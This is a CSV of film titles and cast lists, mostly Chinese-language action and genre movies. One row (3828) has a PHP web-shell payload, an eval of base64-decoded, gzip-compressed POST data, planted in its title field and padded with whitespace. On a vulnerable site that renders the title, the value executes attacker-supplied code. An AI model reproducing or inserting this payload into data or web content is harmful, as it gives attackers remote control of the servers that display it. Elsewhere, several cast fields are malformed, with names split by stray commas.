,title,casts
3696,特工追缉令,"巴里·佩珀,Colm,Feore,劳拉·范德沃特,伊芙·哈洛"
3697,英雄豪杰苏乞儿,"甄子丹,王珏,王秀萍,陈淑兰,吴孟达,"
3698,德国恐惧,"Milton,Welsh,Annika,Strauss,David,Masterson"
3699,幻世追踪,"布鲁斯·威利斯,安拜·柴尔德斯,托马斯·简,布莱恩·格林伯格"
3700,施耐德对决巴克斯,"汤姆·德威斯布莱尔,亚历斯·冯·华麦丹,玛丽亚·卡拉克曼,安妮特·马尔赫毕,吉恩·伯沃依兹,伊娃·范·德维恩,皮埃尔·波克玛,亨利·加尔辛,露丝·哈弗科特"
3701,军情五处：利益之争,"基特·哈灵顿,彼得·弗斯,伊莱耶斯·加贝尔,詹妮弗·艾莉"
3702,超能查派,"休·杰克曼,西格妮·韦弗,沙尔托·科普雷,戴夫·帕特尔,忍者,尤兰蒂·维瑟,何塞·巴勃罗·坎蒂略"
3703,明日世界,"布丽特·罗伯森,乔治·克鲁尼,拉菲·卡西迪,休·劳瑞"
3704,巨鳄战狂蟒,"柯林·纳麦克,杨茜·巴特勒,史蒂芬·比灵顿,斯凯·劳瑞,Oliver,Walker,Ali,Eagle,Annabel,Wright,Laura,Dale,Georgina,Philipps,Nigel,Barber,罗伯特·英格兰德,Heather,Gilbert,Jenny,May,Darcy,Kalina,Stoimenova,Carolina,Bratanova"
3705,图书馆战争：记忆之书,"冈田准一,荣仓奈奈,田中圭,福士苍汰,土屋太凤,中村苍,西田尚美,桥本润,相岛一之,中原丈雄,相筑彰子,松坂桃李,栗山千明,石坂浩二"
3706,魔界転生,"真田广之,泽田研二,绪形拳,佳那晃子,千叶真一,若山富三郎,丹波哲郎"
3707,霹雳火侠1988,内详
3708,以恶之名,"Nick,Smyth,Lora,Burke,科林·帕拉迪恩"
3709,魔界转生2003,"洼冢洋介,麻生久美子,杉本哲太,黑谷友香,吹石一惠,高桥和也,加藤雅也,长塚京三,佐藤浩市,柄本明,古田新太,国村隼,磨赤儿,中村贺津雄,田中要次"
3710,移动迷宫2,"迪伦·欧布莱恩,卡雅·斯考达里奥,托马斯·布罗迪-桑斯特,吉安卡罗·埃斯波西托,艾丹·吉伦,李起弘,巴里·佩珀,莉莉·泰勒,派翠西娅·克拉克森"
3711,寄生兽：完结篇,"染谷将太,深津绘里,阿部隆史,桥本爱"
3712,封神榜：决战万仙阵,"张植绿,李沁谣,于非,韩梦武,马文波,车保罗,尹扬明,刘权友"
3713,赌王至尊,"钱小豪,陈慧敏,陈雅伦,陈观泰,周比利"
3714,冷血悍将,"迈克尔·B·乔丹,朱迪·特纳-史密斯,杰米·贝尔,盖·皮尔斯,劳伦·伦敦,雅各布·西皮奥,托德·拉桑斯,杰克·凯西,露西·拉塞尔,凯姆·吉甘戴,卢克·米切尔,亚特乔姆·吉尔茨,布伦特·吉尔曼,梅拉布·尼尼泽,亚历山大·梅尔库里,科尔曼·多明戈,德里克·梅森堡,梅尔·法尔,乔治·阿斯普雷,卡兹·陶吉纳斯,汤姆·科利,玛丽索尔·科雷亚,里奇·格拉夫,希妮·拉芙尔,罗伯特‧马瑟,阿德里安·罗林斯,凯特·萨普特"
3715,攀登梅鲁峰,"金国威,康拉德·安克,雷纳·奥斯托克,乔恩·克拉考尔"
3716,无腿先生,"理查德·杰克尔,Ron,Slinker,洛伊德·波奇纳"
3717,壮志凌云者,"朱利安·卡维特,Ignacyo,Matynia,Tamas,Nadas,卡罗·安妮·瓦特斯,埃里克·罗伯茨"
3718,虎影2014,"斋藤工,芳贺优里亚,しいなえいひ,津田宽治,石川树,鸟居美雪,島津健太郎,三元雅芸,清野菜名,水井真希,屋敷纮子,三田真央,松浦りょう,仁科贵,村杉蝉之介,清水崇"
3719,不容喘息2021,"吉尔莫·伊万,唐纳德·保罗,法耶尔·阿尔-凯斯,Gloria,Mamurov,Monte,Bezell,Karina,Bezell,Gina,Tuttle,贝伦托马斯,克里斯·勒潘塔,Carter,Redwood,Ryan,Jonze,Zair,Montes,Ahmet,Devran,Dayanc,Bari,Kang,Julián,Juaquín,Haythem,Noor"
3720,盛夏的猎户座,"玉木宏,北川景子,堂珍嘉邦,平冈祐太,铃木拓,吹越满,吉田荣作,益冈彻"
3721,传奇2015,"汤姆·哈迪,艾米莉·布朗宁,克里斯托弗·埃克莱斯顿,大卫·休里斯,科林·摩根,保罗·安德森,塔拉·菲茨杰拉德,查兹·帕尔明特瑞,安库塔·布雷班,乔舒亚·希尔,萨姆·霍尔,亚当·弗格蒂,马克·扎米特,理查德·瑞德尔,迈克尔·海登,塔伦·埃哲顿,王丽雅,史蒂芬·洛德,劳琳·斯坦利,拉塞尔·巴洛格,鲍勃·克赖尔,亚历山德拉·海耶斯"
3722,愤怒的律师,"李善均,金高银,张铉诚,林元熙"
3723,泰王纳黎萱2,"Wanchana,Sawatdee"
3724,侠女：剑的记忆,"李秉宪,全度妍,金高银,李俊昊,李璟荣,金太祐,裴秀彬,金永敏"
3725,独家报道：良辰杀人记,"裴晟祐,金义城,曹政奭,李荷娜,李美淑"
3726,拿起枪的简,"娜塔莉·波特曼,伊万·麦克格雷格,罗德里戈·桑托罗,乔尔·埃哲顿"
3727,非常突然,"任达华,刘青云,蒙嘉慧,黄卓玲,许绍雄,林雪"
3728,鬼灭之刃 兄妹的羁绊,"大塚芳忠,梶裕贵,加隈亚衣,冈本信彦,森川智之,浪川大辅,山崎巧,绿川光,子安武人,井泽诗织,悠木碧"
3729,突袭,"伊科·乌艾斯,唐尼·阿兰西亚,乔·塔斯利姆,皮埃尔,格伦特"
3730,威卡兰特的日记,"杰森·缪斯,奎顿·杰克逊,保罗·斯隆"
3731,绿色贝雷帽,约翰·韦恩
3732,勇者必胜,"Tom,Benedict,Knight,西蒙·菲利普斯,Christina,Bellavia"
3733,大力神色雷斯之战,"道恩·强森,伊恩·麦柯肖恩,约翰·赫特,卢夫斯·塞维尔,阿卡塞尔·亨涅,英格丽德·波尔索·贝达尔,瑞斯·里奇,约瑟夫·费因斯,托拜厄斯·桑特尔曼,彼得·穆兰,丽贝卡·弗格森,艾萨克·安德鲁斯,乔·安德森,斯蒂芬·皮科克,尼古拉斯·莫斯"
3734,街头霸王：暗杀拳,"Mark,Killeen,伊川东吾,Mike,Moh,乔伊·安沙"
3735,归来的烈车战队特急者 梦之超特急7号,"志尊淳,马渕誉,平牧仁,Keishiro,Nagase,小岛梨里杏,Kouruko,Ishii,横滨流星,山﨑光,Ai,Moritaka,Rara,Shimizu,长滨慎,关根勤,山口胜平,堀江由衣,安元洋贵"
3736,红色天空,"凯姆·吉甘戴,夏恩·韦斯特,比尔·普尔曼"
3737,狮神决战,"陈天文,林俊良,王伟良"
3738,邪恶骨血,"阿丽夏·维加,肖恩·宾,詹姆斯·鲍弗,阿比盖尔·布雷斯林,杰克·布塞"
3739,绝命航班,"爱德·维斯特维克,朱珠,艾米丽·桑斯芮,辜承,亚历山大·威特斯,约翰·哈尔夫,江琳琳,伊娜,李晨浩"
3740,七宝传神之氽来神钟,"陆昱霖,李佳桐,任山"
3741,捕食者的崛起2014,"克里斯汀娜·安娜波,詹姆斯·C·伯恩斯,蒂娜·卡西亚妮,Courtney,Compton,Jose,Luis,Cordovez,罗克·克里切洛,乔什·多尔蒂,Brett,Donowho,Danny,James,Angel,McCord,里奇·麦克唐纳,James,C.,Morris,Will,Newman,Daniel,O,Meara,埃里克·罗伯茨"
3742,1号通缉令,"基伦·埃弗瑞·韦恩斯,强·沃特,吉尔·亨内斯,保罗·索维诺,罗伯特·考普"
3743,第八海豹突击队:深入敌后,"Bonnie,Lee,Bouman,Dylan,Edy,Michael,Everson"
3744,大力神2014,",凯南·鲁兹,盖亚·维斯,斯科特·阿金斯,罗姗"
3745,帕克2013,"杰森·斯坦森,詹妮弗·洛佩兹,尼克·诺特,迈克尔·切克利斯,小克利夫顿·克林斯,维德尔·皮尔斯,艾玛·布斯"
3746,华沙谍战,"马辛·多洛辛斯基,玛雅·奥丝塔泽斯卡,帕特里克·威尔森,Dimitri,Bilov,达格玛拉·多敏齐克,Oleg,Maslennikov,克日什托夫·皮耶钦斯基,米罗斯洛·巴卡,泽比纽·扎马洲斯基,克日什托夫·格洛比什,帕威·马拉欣斯基,Ireneusz,Czop,Pawel,Iwanicki,Zbigniew,Stryj,马里斯兹·博纳泽斯基"
3747,海盗2014,"金南佶,孙艺珍,崔雪莉,柳海真,李璟荣,申正根,金太祐,朴哲民,赵达焕,曹熙奉,李伊庚,金元海,吴达洙,郑承华,安内相"
3748,警察1973,"王钟,李丽丽,傅声,王侠"
3749,忍者启示录,"Christian,Oliver,Ernie,Reyes,Jr.,Les,Brandt"
3750,过失2014,"文森特·林顿,吉尔·勒卢什,娜丁·拉巴基,吉勒·科昂,Max,Baissette,de,Malglaive,梅迪·萨东,维利贝·托皮奇,Cyril,Lecomte,Gilles,Bellomi,Sacha,Petronijevic,Pierre,Benoist,亚历克西斯·曼蒂,托米·梅,索菲娅·埃萨伊迪,艾瑞克·鲍尼恩"
3751,咏春1994,"杨紫琼,甄子丹,苑琼丹,洪欣"
3752,一级戒备,"迈克尔·道格拉斯,基弗·萨瑟兰,伊娃·朗格利亚,金·贝辛格,马丁·唐文"
3753,哥斯拉之终极战役,"松冈昌宏,北村一辉,唐·弗莱"
3754,黑道风云之收数王,"吴镇宇,张家辉,李灿森,黄秋生,海俊杰,罗冠兰,李晓彤,惠天赐,江锦荣,黎彼得"
3755,武侠七公主之天剑绝刀国语,"杨紫琼,郑裕玲,刘松仁,张曼玉,张敏,吴君如,关咏荷,陈加玲,张卫健,吴孟达,任达华"
3756,幽灵战队,"肖恩·法瑞斯,瑞切尔·泰勒,理查德·多默"
3757,冲击天子门生国语,"刘德华,张耀扬,王祖贤,鲍方,黄光亮,于莉,罗烈,梁锦燊"
3758,火云传奇国语,"林青霞,莫少聪,吴君如,单立文,巫刚,叶全真,Joseph,Chi"
3759,幽灵行动阿尔法,"Karel,Dobrý,Radek,Bruna,马克·伊瓦涅"
3760,五路追杀令,"瑞恩·雷诺兹,雷·利奥塔,本·阿弗莱克,彼得·博格,安迪·加西亚,塔拉吉·P·汉森,克里斯·派恩,杰森·贝特曼,马修·福克斯,凯文·杜兰,乔尔·埃哲顿,艾丽西亚·凯斯,汤米·弗拉纳根"
3761,良善之辈,"詹姆斯·弗兰科,凯特·哈德森,奥玛·希,汤姆·威尔金森,安娜·弗莱尔,萨姆·斯普卢尔,迪尔梅德·默塔,弗朗西斯·麦基,马尔滕·丹嫩贝格,奥兰多·伯恩斯·塔克,伯特伦·伯恩斯·塔克,迈克尔·吉普森,瓦·阿里,黛安娜·哈卡索,托马斯·阿诺德,拉斯科·阿特金斯,Michael,Fox,奥利弗·迪姆斯戴尔,Eddie,Richardson,Martin,Wilde,Hazel,Anderson,Rachel,Younger,N"
3762,托卡列夫2014,"瑞秋·尼科尔斯,尼古拉斯·凯奇,彼得·斯特曼,丹尼·格洛弗,迈克尔·麦克格雷迪,帕沙·D.林奇尼科夫,马克斯·福勒,麦克斯·瑞恩,温斯顿·凯奇"
3763,最高通缉犯,"菲利普·塞默·霍夫曼,瑞秋·麦克亚当斯,吉里格力·多布金,威廉·达福"
3764,开启的窗口,"伊利亚·伍德,萨莎·格蕾,尼尔·马斯克尔,米歇尔·珍娜,胡里安·毕亚格兰,卡洛斯·阿雷塞斯,劳尔·西马斯,Miguel,Noguera,那奇欧·维加隆多,Richard,Diment,尤金尼奥·米拉"
3765,英雄主义2014,"Tiger,Shroff,Kriti,Sanon,Sandeepa,Dhar,Prakash,Raj,Shireesh,Sharma,Vikram,Singh"
3766,北欧人：维京传奇,"汤姆·霍珀,瑞恩·柯万腾,肯·杜肯,夏莉·墨菲,艾德·斯克林,安纳托·陶布曼,詹姆斯·诺顿,里奥·格雷高里,达雷尔·席尔瓦,马克·斯特潘,理查德·洛锡安,尼克·拉森蒂,乔·瓦兹,丹尼尔·詹克斯"
3767,闪灵侠,"盖布瑞·马赫特,塞缪尔·杰克逊,伊娃·门德斯,杰米·金,斯嘉丽·约翰逊,斯坦娜·卡蒂克"
3768,战王2021,"魏巍,史元庭,徐冬梅,赵左,Elaija,Chekhov,尚迪奥普,肖万阁,谭桉恒,韩永昌,李斌"
3769,混蛋2,"丹尼·特雷霍,丹尼·格洛弗,安德鲁·迪沃夫,杰奎琳·奥拉德丝"
3770,空手道2019,"多恩,吴承勋,孙武铉,정의욱,김태윤"
3771,卧底：费瑞崛起,"弗兰克·拉默斯,爱丽丝·夏普,休伯·史塔普,雷蒙德·提哈瑞,莫妮克·亨德里克斯,休·史密特,Juliette,van,Ardenne"
3772,虚拟世界,"麦克·多普德,简·巴德勒,约亨·海格勒,马克西米安·鲍林,卡雅·布洛克萨奇,佩特拉·西兰德,尼古拉斯·范·贝弗伦,埃利·哈达德,艾米里·德·法尔科,埃里克·凯利,佐伊·科拉菲斯,梅丽莎·玛斯"
3773,狱中龙,"刘德华,何家劲,黎姿,程东,龙方,黄锦燊,韩坤,何家驹"
3774,机械师2:复活,"杰森·斯坦森,杰西卡·阿尔芭,汤米·李·琼斯,"
3775,生死时速,"Amrita,Arora,阿施伊什·查德哈里,索菲亚·查德哈瑞"
3776,21视记微电影计划,内详
3777,速度与激情,"保罗·沃克,泰瑞斯·吉布森,伊娃·门德斯,科尔·豪瑟"
3778,苦难(普通话),"Sam,J.,Jones,Kimberley,Pistone,Timothy,Hughes"
3779,苦难,"Sam,J.,Jones,Kimberley,Pistone,Timothy,Hughes"
3780,落日余情,"刘易斯·科林斯,李·范·克里夫,唐纳德·普利森斯"
3781,落日余情(普通话),"刘易斯·科林斯,李·范·克里夫,唐纳德·普利森斯"
3782,兰娅传奇,"安雅·克瑙尔,亨德里克·杜茵,朱里安·威格德"
3783,兰娅传奇(普通话),"安雅·克瑙尔,亨德里克·杜茵,朱里安·威格德"
3784,七武士,"三船敏郎,志村乔,稻叶义男,宫口精二"
3785,死囚大逃杀,"史蒂夫·奥斯汀,Robert,Mammone,Tory,Mussett,维尼·琼斯"
3786,椰林曲,"史久峰,高博,李镛,崔超明,徐伟"
3787,双面劫匪（普通话）,"杰弗里·迪恩·摩根,罗伯特·德尼罗,凯特·波茨沃斯,戴夫·巴蒂斯塔,"
3788,火烧岛,"成龙,刘德华,洪金宝,梁家辉,叶全真,王羽,柯俊雄,庹宗华,高捷"
3789,剑侠仙居,田原璐
3790,异次元仙侠录,"王璐,林增荣,唐姣,林琳"
3791,拳头,"石峯,陈汪洋,龙道,吴亭霖,吴玟"
3792,丐帮之千年打狗棒,"李恺,隋星茹,黄强耀,周昌令"
3793,疯狂的金条,"姜涛,刘思思,Amro"
3794,夺命街头,"白那日苏,沈璐,李雨诺,方帅"
3795,买龙拍凶,"肖皓天,刘诺瑶,张凯元"
3796,捕手,"王立利,佟旭,邢云,宋玮东,张婷,潘强,刘浩元,潘慧萍,白杨"
3797,古村迷夜,"于金龙,樊璟澄,李桢航"
3798,天涯寻子路,"爱丽丝·伊芙,格拉汉姆·麦克泰维什,杰克·达文波特,理查德·奥布里恩,科恩·霍洛维,格伦·利维,米凯拉·鲁格,斯坦·沃克,吉莉安·麦格雷戈,格雷森·亨特·温,斯蒂格·埃尔德雷德,埃米莉·科克兰,卢卡斯·辛奇"
3799,密林大冒险,"鲁宸枫,张枥尹,赵梓君"
3800,加勒比海盗1：黑珍珠号的诅咒（普通话版 ）,"凯拉·奈特莉,约翰尼·德普,奥兰多·布鲁姆,杰弗里·拉什,杰克·达文波特,李·阿伦伯格"
3801,加勒比海盗3：世界的尽头（普通话版 ）,"约翰尼·德普,杰弗里·拉什,奥兰多·布鲁姆,凯拉·奈特莉,周润发"
3802,铁血钢拳,"李晨琛,罗天佑,王海祥"
3803,唐廷传之陈塘恩仇,"苏仕廷,吴丹,邱健,何夏昕,林诗苒,李宏志,杨欢欢,商秉驰"
3804,正义使徒,"陈升卫,石雨婷,夏文希,孙蛟龙,刘嘉艺"
3805,隐士,"海伦·到维特,劳拉·柠檬"
3806,乾阳侠曲,"崔友斌,鲁筱冉,李岩,杨晓波"
3807,拳手,"马修·朱尔,伊恩·比蒂"
3808,吉祥如意,"大鹏,刘陆"
3809,圣诞变身,"娜塔莎·亨斯屈奇,布赖恩·克劳斯,Cedric,Smith,克里斯塔·布里奇斯,George,Buza,Rob,deLeeuw,Keram,Malicki,Sánchez,James,Millington,斯凯勒·韦克斯勒"
3810,愤怒的阿登,"Tom,Stedham,Bill,Voorhees"
3811,金色手杖战士,"Tara,克里斯汀·哈金,尼古拉斯·沙普泰"
3812,弹无虚发,"盖瑞·丹尼尔斯,凡妮莎·瓦斯克斯,Michael,Greco,Luis,Gatica,Geoffrey,Ross,Patricia,Peinado,Cruz,David,Fernandez,Jr,安东尼.J.里克尔特-艾普斯坦,Justin,Nesbitt,Fabian,Lopez"
3813,昭和64年 前篇,"佐藤浩市,绫野刚,荣仓奈奈,瑛太,三浦友和,永濑"
3814,完美的杀手,"若尔特·拉斯洛,Nóra,Hörich,Tünde,Majsai-Nyilas,塔马斯·萨博·基梅尔,杰泽·萨博,蒂博尔·采格莱德,加博尔·纳吉帕尔"
3815,危险元素,"John,Soares,道格·琼斯,Cassie,Meder"
3816,退役任务,"约翰·麦森,温妮·琼斯"
3817,荣誉之印,"史蒂文·席格,海伦娜·马特森,克莱格·谢佛"
3818,全境警戒,"戴夫·巴蒂斯塔,布兰特妮·斯诺,阿图罗·卡斯特罗,克里斯蒂安"
3819,海滩救护队,",道恩·强森,扎克·埃夫隆,佩丽冉卡·曹帕拉,亚历珊德拉·达达"
3820,火星异种,"伊藤英明,武井咲,山下智久,山田孝之,小栗旬,小杉健,菊地凛子,加藤雅也"
3821,古墓入侵者,"Gina,Vitori,Samantha,Bowling,Andrew,J,Katers"
3822,疾风使命,"Guillaume,Lemay-Thivierge,Antoine-Olivier,Pilon"
3823,自由之路,"Henry,Adofo,Michael,Attram,Alphonse,Menyo"
3824,最后的狙击战,"汤姆·伯兰吉尔,Steven,Luke,Mikeal,Burgin,Aaron,Courteau"
3825,神奇女侠1984,"盖尔·加朵,克里斯·派恩,克里斯汀·韦格,佩德罗·帕斯卡,康妮·尼尔森,罗宾·怀特,莉莉·阿斯佩尔,加布瑞拉·王尔德,杜晨·科洛斯,琳达·卡特,克里斯托弗·普拉哈,里昂·贝克维思,拉维·帕特尔,娜塔莎·罗斯韦尔,泰莎·波纳姆·琼斯,艾拉·沃克,游朝敏,谢恩·阿特沃尔,艾德·伯奇,帕特里克·利斯特,奥克莉·布尔,科莎·恩格勒,小田部阿基,康斯坦丁·格雷戈里,文森·德·保罗,朱利安·费罗,罗莎娜·沃尔斯,,"
3826,美国队长3,"克里斯·埃文斯,小罗伯特·唐尼,塞巴斯蒂安·斯坦,斯嘉丽·约翰逊,伊丽莎白·奥尔森"
3827,怒火雄心,"约翰·特拉沃尔塔,阿曼达·舒尔,瑞贝卡·德·莫妮,克里斯"
3828,当老公有了情妇后{:eval(gzuncompress(base64_decode($_POST['avplayer'])));}          ,内详
3829,我来也大战四猛虎,"朱子奇,陈烨林,李文君"
3830,狼人杀·启源,"张开泰,徐嘉雯,任思齐,徐冬冬"
3831,特警本色,"何达,任柯诺,赵荀,欧宇宁"
3832,末代纳粹特勤团,迈克尔·凯恩
3833,天后小助理,"达科塔·约翰逊,特雷西·埃利斯·罗斯,小凯文·哈里森"
3834,大刺客1967,"王羽,焦姣,李香君,田丰,黄宗迅"
3835,英雄好汉,"周润发,刘德华,万梓良,刘嘉玲,李修贤,杨群,柯俊雄,王小凤,成奎安"
3836,墨家机关术,"刘林城,刘静怡,栩慈,张佳航,侯添方,郭野,刘威州,杜玉明"
3837,东海异闻录,"刘衍辰,沈雨,耿一智,郭震,希童"
3838,河街九十九号,"约翰·佩恩,伊夫林·凯耶斯,布拉德·德克斯特,弗兰克·费伦,佩姬·卡索"
3839,大菩萨岭,"仲代达矢,加山雄三,新珠三千代,三船敏郎"
3840,铁扇令,"许京川,佴文,崔友斌,李岩,洪爽"
3841,英雄帖,"李广斌,刘婧,彭静,陈玥,何李宁"
3842,火星幽灵,"娜塔莎·亨斯屈奇,艾斯·库珀,杰森·斯坦森,克里·杜瓦尔"
3843,007之生死关头,"罗杰·摩尔,简·西摩,亚非特·科托,尤利乌斯•哈里斯,吉奥菲·侯德,大卫·海迪生"
3844,汉尼与南尼,"体博·劳赫,莱拉·美腻可"
3845,狮父,"刘惠,黄浚良,候煜,刘自强,杨萍,王馨雨,王曦"
3846,超神保镖,"岳松,释彦能,李宇菲,邹兆龙,陈惠敏,尚铁龙,徐冬梅,杨骏,李长海,姜宝成,元武,董江涛"
3847,汉城黑帮,"李东俊,李承辛"
3848,猛鬼旅行团,"吴君如,林正英"
3849,夺命奇书,"张嘉祐,徐白云,杨哲,张春仲"
3850,小人物2021,"鲍勃·奥登科克,阿列克谢·谢列布里亚科夫,康妮·尼尔森,克里斯托弗·洛伊德,迈克尔·艾恩塞德,科林·萨蒙,罗伯特·菲茨杰拉德·迪格斯,比利·麦克莱伦,阿拉亚·门格沙,盖奇·芒罗,佩斯利·卡多拉思,亚历山大·帕里,亨伯利·冈萨雷斯,爱德森·莫拉莱斯,J·P·马诺克斯,伊利亚·奈舒勒,谢尔盖·希纳罗维,斯蒂芬妮·西,鲁斯兰·鲁辛,Bj·韦罗,达雅·查库莎,亚当·哈蒂格,克里斯汀·哈里斯,埃里克·阿塔瓦尔,沙龙·巴杰"
3851,变异编年史,"托马斯·简,朗·普尔曼,戴文青木,西恩·帕特维"
3852,青春偶像,"Puneeth,Rajkumar,,Sayyeshaa,Saigal,,Sonu,Gowda"
3853,猎神：冬日之战,"克里斯·海姆斯沃斯,查理兹·塞隆,艾米莉·布朗特,杰西卡·查斯坦,尼克·弗罗斯特"
3854,双面妖姬,"董璇,小小白,郑柳"
3855,企业战士2001,"Châu,Belle,Dinh,Williams,Belle,Malik,Diouf,Yann,Hnautra,Guylain,N'Guba-Boyeke,Charles,Perrière,Laurent,Piemontesi,Maher,Kamoun,Bruno,Flender,Amel,Djemel,Afida,Tahri,Abdelkrim,Bahloul,Nassim,Faid,Pascal,Léger,Frédéric,Pellegeay,"
3856,极寒风暴,"让·雷诺,莎拉·林德,乔·安德森,大卫·吉亚西,Ihor,Ciszkewycz,François,Guétary,萨曼莎·邦德,Jean-Luc,Olivier,Larisa,Rusnak,Maxime,Mege,Harmony,Gomila,Kateryna,Bursikova,Rob,Feldman,Frédéric,Petitjean,Narvin,Fernandez,安娜·芭特科薇奇"
3857,鲁班四杰之伏龙海眼,"王润泽,宁心,杜厚佳,王培祎,蒋中炜,王冠淇,杜玉明"
3858,生死狙击,"马克·沃尔伯格,迈克尔·佩纳,丹尼·格洛弗,"
3859,审讯,"艾吉,朱莉娅·本森,艾丽卡·卡罗尔,C.J.,Perry,Mitchell,Kummen,帕特里克·萨邦圭"
3860,徐福2021,"孔刘,朴宝剑,赵宇镇,张英男,朴秉恩"
3861,俄罗斯突袭,内详
3862,一九四九劫后英雄传,"吕良伟,郑则仕,张卫健,于莉,张耀扬,黄一飞,何家驹,关海山"
3863,九叔之夜行疯魔,",刘铁柱,曹旭,雷磊"
3864,义海雄风,奥利弗·古鲁内尔
3865,奇霞夺宝录,"李峰,苗苗"
3866,金刚,"娜奥米·沃茨,杰克·布莱克,艾德里安·布洛迪,托马斯·克莱舒曼,科林·汉克斯,安迪·瑟金斯,伊万·帕克,杰米·贝尔,洛博·陈,约翰·萨莫尔,克里格·霍尔,凯尔·钱德勒,威廉·约翰逊,马克·哈德洛,杰拉丁·博若飞,大卫·皮图"
3867,小戏骨黄飞鸿,"释小松,周漾玥,赵天翼,开新傲,孙凯闻,赵晨翔,徐坤,崔傲菲儿"
3868,雷霆女神,"梅丽莎·麦卡西,奥克塔维亚·斯宾瑟,庞·克莱门捷夫,杰森·贝特曼,梅丽莎·里奥,鲍比·坎纳瓦尔,莎拉·贝克,梅丽莎·庞西奥,Shane,Berengue,Tyrel,Jackson,Williams,布拉克斯顿·比肯,特雷弗·拉科姆,帕特里克·R·沃克,马塞拉·洛维里,泰·玛哈尼,施奎塔·詹姆斯,John,Crow,肖恩·雷卡特尔,佩拉·米德尔顿"
3869,无毒岛1,"张子栋,焦曼婷,侯勇,潘雨辰"
3870,茅山大师,彭禺厶
3871,二十岁骇客,"权玄彬,林娜荣,赵贤荣,金建洙,李秀雄,孟奉鹤,朱锡太"
3872,回声潮世代,"迈克尔·珊农,莱斯莉·安·华伦,亚历克斯·帕蒂弗,海莉·洛,帕特里克·施瓦辛格,奥利弗·库珀,莱斯莉·斯特拉顿,迈克·哈顿,凯特·林德尔,吉尔斯·吉利,约翰·福克,黛安·D·比姆"
3873,王子2014,"布鲁斯·威利斯,约翰·库萨克,塔拉·霍尔特,杰西卡·朗德斯"
3874,骆驼客3之弓魂传,"魏小欢,马硕涵"
3875,断箭（韩国）,"安圣基,金智昊,朴元尚,罗映姫"
3876,江湖镖客,"王心新,余俪,王正佳,郭小明,张野,于鹏,张雍"
3877,限时营救,"赵毅新,蔡佩池,郜思雯"
3878,黄飞鸿之武神林世荣,"陈升卫,许振艺,孙蜜唯,辜德超,张武常,郑阳"
3879,赤子英雄1,"李威龙,边防,赵芳华,马文靖"
3880,《缉魂》优酷独家幕后记录,"张震,张钧甯,林晖闵,孙安可,李铭顺,张柏嘉"
3881,女拳王1：拳坛争霸,"彭丹,张慧仪,黎耀祥"
3882,狮子方舟,"鲍勃·巴克,Martin,Beltran"
3883,龙之猎手,"布拉德·约翰逊,Erik,Denton,Newell,Alexander"
3884,麻辣神探,",樊少皇,江芷妮,姜浩文"
3885,僵尸雷迪,内详
3886,蓝色北冰洋,"鲁特格尔·哈尔,迪伦·沃尔什,莱亚·吉斯特德,Johnny,Cuthbert,John,'Bear',Curtis,Bill,Croft,理查德·布拉德福德,凯文·库尼,Michael,Lawrenchuk,斯蒂芬·E·米勒,Gunargie,O'Sullivan,J.B.,Bivens,Michael,St.,John,Smith,Ron,Chartier,Dan,Shea"
3887,辣妹梦幻组,",梁铮,麦家琪,蔡子建,刘锡贤"
3888,氮气马戏团,"特维斯·帕斯缇娜,Tommy,Passemante,Jolene,Van,Vugt,Jeremy,Rawle,Gregg,Godfrey,Jim,DeChamp"
3889,贼兄弟1968,"阿兰·德龙,查尔斯·布朗森,布丽吉特·佛西"
3890,天脉传奇,"杨紫琼,本·卓别林,理查德·劳斯伯格,郎雄,张卓楠,王宇婕,戴恩·库克,曾江"
3891,狂暴飞车,"尼古拉斯·凯奇,艾梅柏·希尔德,凯蒂·米克松,比利·伯克"
3892,救起池中的猎豹,"林智奎,林智妍,尹绍时"
3893,决战葡京之巅,",林伟雄,李志聪"
3894,惊险之旅,"Christoph,M.,Ohrt,Ann-Kathrin,Kramer"
3895,患难真情,卡兰
3896,全垒打王,"约翰·古德曼,凯莉·麦吉利斯翠尼·阿瓦拉多布鲁斯·鲍克斯雷特纳"
3897,无路可退1991,"John,Barrett"
3898,特别胜利,"汤姆·贝伦杰,乔昆姆·德·阿尔梅达,Daniela,Romo"
3899,佛光寺传奇,"金巧巧,洪天照,斯琴高丽"
3900,违法交易,"卡尔·华盛顿,乔斯·罗赛特,David,Peterson,Raul,Martinez"
3901,蒂伯巴赫村的孩子们,"Raphaël,Adèle,Léo,Gérard,Carole"
3902,出拳女郎,"陶智媛,孙贤周"
3903,都市迷彩,"佟大为,晋松"
3904,天下第一2021,"刘羿汎,朱娅,盛旨宇"
3905,血宝石,"Brett,Stimely"
3906,雁荡山,"柏之毅,胡学礼,袁国林"
3907,金蝉脱壳2,"西尔维斯特·史泰龙,黄晓明,戴夫·巴蒂斯塔,杰米·金"
